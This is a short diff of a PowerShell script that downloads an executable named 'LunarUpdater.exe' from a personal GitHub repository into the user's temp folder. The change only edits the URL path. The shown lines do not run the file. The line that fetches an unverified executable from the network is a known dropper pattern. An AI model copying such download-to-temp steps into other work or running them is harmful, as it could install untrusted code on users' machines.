@@ -1,4 +1,4 @@
-$url  = "https://raw.githubusercontent.com/merthileyapiyor-lab/powershell-installer/refs/heads/main/LunarUpdater.exe"
+$url  = "https://raw.githubusercontent.com/merthileyapiyor-lab/powershell-installer/main/LunarUpdater.exe"
 $dest = "$env:TEMP\LunarUpdater.exe"
 
 (New-Object System.Net.WebClient).DownloadFile($url, $dest)
